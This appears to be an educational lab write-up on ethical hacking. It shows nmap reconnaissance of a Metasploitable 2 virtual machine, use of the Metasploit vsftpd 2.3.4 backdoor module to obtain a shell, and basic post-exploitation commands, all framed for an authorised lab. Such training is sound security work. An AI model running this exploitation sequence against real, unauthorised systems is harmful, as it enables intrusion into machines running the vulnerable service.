Experiment 2: Simulated Ethical Hacking with Metasploit
Objective
To perform a safe exploitation exercise on a virtual machine using Metasploit and understand the basic stages of ethical hacking.

Environment
Kali Linux (Attacker)
Metasploitable 2 (Victim/Test)
VirtualBox or VMware
Host-Only Adapter or Internal Network
Procedure
Step 1: Configure Virtual Machines
Install Kali Linux and Metasploitable 2, configure both machines with a Host-Only Adapter or Internal Network, and boot both machines.

Step 2: Verify Network Connectivity
Check the IP address of Metasploitable 2 and verify connectivity from Kali Linux.

On Metasploitable 2:

ifconfig
On Kali Linux:

ping <Metasploitable_IP>
Step 3: Perform Reconnaissance
Scan Metasploitable 2 to identify open ports, services, and operating system details.

nmap -sS -sV -O <Metasploitable_IP>
Step 4: Save Nmap Results
Save the scan results into a text file.

nmap -sS -sV -O -oN metasploitable_scan.txt <Metasploitable_IP>
Step 5: Launch Metasploit
Start the Metasploit Framework.

msfconsole
Step 6: Search for the Exploit
Search for the vsftpd exploit.

search vsftpd
Step 7: Select the Exploit Module
Select the vsftpd 2.3.4 backdoor exploit module.

use exploit/unix/ftp/vsftpd_234_backdoor
Step 8: Set the Target Host
Set the IP address of the Metasploitable 2 machine.

set RHOST <Metasploitable_IP>
Step 9: Set the Target Port
Set the FTP service port.

set RPORT 21
Step 10: Execute the Exploit
Execute the exploit against the Metasploitable 2 test machine.

exploit
Step 11: Verify the Shell and System Information
Verify the command shell and gather basic system information.

whoami
uname -a
ifconfig
Step 12: Check Processes and Network Services
View running processes and listening network services.

ps aux
netstat -tulnp
Step 13: Create and View a Test File
Create and view a test file on the target machine.

echo "This is a test file" > /tmp/test.txt
cat /tmp/test.txt
Result
The target machine was scanned, a known vulnerable service was identified, and a controlled exploitation exercise was performed using Metasploit in the lab environment.

Conclusion
The experiment demonstrated the basic process of reconnaissance, exploitation, and post-exploitation using Nmap and Metasploit in a controlled virtual environment.

Ethical Consideration
This experiment should be performed only on the provided Metasploitable 2 test machine or another explicitly authorized lab environment.
